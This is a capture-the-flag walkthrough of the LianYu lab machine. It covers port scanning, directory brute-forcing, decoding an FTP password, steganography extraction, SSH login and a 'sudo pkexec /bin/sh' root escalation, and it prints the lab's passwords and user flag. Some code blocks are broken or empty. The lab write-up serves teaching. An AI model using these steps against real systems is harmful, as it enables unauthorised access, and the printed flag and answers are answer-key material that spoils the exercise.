## Task 1: Find the Flags
### What is the Web Directory you found?
- We can scan the target machine using `nmap`.
```
$ nmap -sC -sV 10.10.167.102

Nmap done: 1 IP address (1 host up) scanned in 27.56 seconds
```
- As we can see there are three open ports:

| Port | Service | 
|--|--|
| 21 | ftp |
| 22 | ssh |
| 80 | http | 
| 111 | rpcbind |

- Let's use `gobuster` to brute force the web pages.
```

- Let's go to the `/island` webpage.

- So the username is `vigilante`.
- For now, let's conduct a `gobuster` scan on `/island/` using another list.

### Answer
```
2100
```

&nbsp;

### what is the file name you found?
- Let's visit the `/island/2100` page and check it's source.

![4](https://github.com/Knign/Write-ups/assets/110326359/1dd3a4e5-6d5c-4d49-a83c-49b17b1816a1)

- Now that we know the file extension is `.ticket`, we can perform another `gobuster` scan.
```

/green_arrow.ticket   (Status: 200) [Size: 71]
-- snip --;
```
### Answer
```
green_arrow.ticket
```

&nbsp;

### what is the FTP password?
- Let's visit the `/island/2100/green_arrow.ticket` page.

![5](https://github.com/Knign/Write-ups/assets/110326359/7584a57b-97d4-43a1-b865-bcb355a088f3)

```
RTy8yhBQdscX
```
- Let's decode the string using Cyberchef.

![6](https://github.com/Knign/Write-ups/assets/110326359/83b49e60-62c7-4e8c-bf2b-6471c2068bad)

- So the FTP password is `!#th3h00d`.
### Answer
```
!#th3h00d
```

&nbsp;

### what is the file name with SSH password?
- We can now use `vigilante` as the username and `!#th3h00d` as the password to login through FTP.
```
$ ftp vigilante@10.10.167.102

- Let's check out the images.

- We can see that the `Leave_me_alone.png` file is not working properly.
- Let's check its has dump.
```
$ xxd Leave_me_alone.png | head

- So the first  8 characters are wrong. In a PNG file the first 8 characters should be `89 50 4E 47 0D 0A 1A 0A` as shown in this image:

![8](https://github.com/Knign/Write-ups/assets/110326359/ba5b98c1-04ee-45b0-af5f-47823fc5377a)

- Let's use `hexedit` to fix the bytes.
```
$ hexedit Leave_me_alone.png
```

![9](https://github.com/Knign/Write-ups/assets/110326359/e84cd651-d29b-4ff1-9c11-595357e6babe)

- The password for something is `password`.
- Let's now extract the file in `aa.jpg` using this password.
```
$ steghide extract -sf aa.jpg        
Enter passphrase: 
wrote extracted data to "ss.zip".
```
- We can now `unzip` the ZIP file.
```
$ unzip ss.zip                        
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado  
```
- Let's read the `shado` file.
```
$ cat shado      
M3tahuman
```
- Another password.
### Answer
```
shado
```

&nbsp;

### user.txt
- We also downloaded the `.other_user` file from the FTP server. Let's read that.
```
$ cat .other_user
Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.

Chosen for a secret experiment, the Army imbued him with enhanced physical powers in an attempt to create metahuman super-soldiers for the U.S. military. Deathstroke became a mercenary soon after the experiment when he defied orders and rescued his friend Wintergreen, who had been sent on a suicide mission by a commanding officer with a grudge.[7] However, Slade kept this career secret from his family, even though his wife was an expert military combat instructor.

A criminal named the Jackal took his younger son Joseph Wilson hostage to force Slade to divulge the name of a client who had hired him as an assassin. Slade refused, claiming it was against his personal honor code. He attacked and killed the kidnappers at the rendezvous. Unfortunately, Joseph's throat was slashed by one of the criminals before Slade could prevent it, destroying Joseph's vocal cords and rendering him mute.

After taking Joseph to the hospital, Adeline was enraged at his endangerment of her son and tried to kill Slade by shooting him, but only managed to destroy his right eye. Afterwards, his confidence in his physical abilities was such that he made no secret of his impaired vision, marked by his mask which has a black, featureless half covering his lost right eye. Without his mask, Slade wears an eyepatch to cover his eye.
```
- So it seems like `M3tahuman` is the password for the user `slade`.
- Let's try it out.
```

slade@LianYu:~$ 
```
- Let's get the flag inside `user.txt`.
```
slade@LianYu:~$ ls

slade@LianYu:~$ cat user.txt 
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}

### Answer

```

&nbsp;

### root.txt
- Let's check what files `slade` can execute without the password.
```
slade@LianYu:~$ sudo -l
[sudo] password for slade: 
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```
- We can go to GTFOBins to find an exploit.

```
slade@LianYu:~$ sudo pkexec /bin/sh
# 
```
- We can now get the root flag.
```
# ls
root.txt
# cat root.txt
